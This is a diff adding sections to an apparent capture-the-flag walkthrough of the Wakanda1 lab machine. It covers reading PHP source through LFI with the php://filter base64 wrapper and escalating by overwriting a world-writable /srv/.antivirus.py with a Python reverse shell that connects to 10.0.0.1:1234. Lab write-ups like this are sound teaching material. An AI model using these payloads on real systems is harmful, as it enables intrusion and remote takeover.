@@ -30,6 +30,16 @@ http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=in
 > After [http://192.168.56.101/index.php?lang=php://filter/convert.base64-encode/resource=index]
 there are  encoded words.
 
+> According to PHP official documentation, PHP supports four categories of filters.
+>
+
+   - String Filters
+   - Conversion Filters
+   - Compression Filters
+   - Encryption Filters
+
+##### Of the above, base64-encode filter from the conversion filter can be used to retrieve arbitrary server file through LFI. It is also possible to use zlib.inflate or bzip2.compress from the compression filters to retrieve server files without executing them. But I prefer to use base64-encode because of its ease of use
+
 > curl http://192.168.56.101/index.php?lang=php://filter/convert.base64-encode/resource=index | head -n 1 | base64 -d
 We'll get php code in which there is password.
 
@@ -124,6 +134,45 @@ mamadou@Wakanda1:~$ id
 uid=1000(mamadou) gid=1000(mamadou) groups=1000(mamadou)
 mamadou@Wakanda1:~$ 
 ```
+> locate flag2.txt by typing [ locate flag2.txt ] 
+>
+> find devops user by typing [ find / -user devops ]
+>
+> we'll get many file directories but all are Permission Denied.
+>
+> in the first line we got [/srv/.antivirus.py]
+>
+> try to get into that directory.
+>
+```
+mamadou@Wakanda1:~$ ls -al /srv
+total 12
+drwxr-xr-x  2 root   root      4096 Aug  1 17:52 .
+drwxr-xr-x 22 root   root      4096 Aug  1 13:05 ..
+-rw-r--rw-  1 devops developer   36 Aug  1 20:08 .antivirus.py
+mamadou@Wakanda1:~$ more /srv/.antivirus.py
+open('/tmp/test','w').write('test')
+```
+> when this script is ran this will write to /temp/test,the temp folder is used for startup functionality. to get access use shell.
+>
+> try using python shell.
+>
+```
+open('/tmp/test','w').write('test')
+
+import socket
+import subprocess
+import os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("10.0.0.1",1234)) 
+os.dup2(s.fileno(),0) 
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/sh","-i"])  
+```
+
+
+
 
 
 
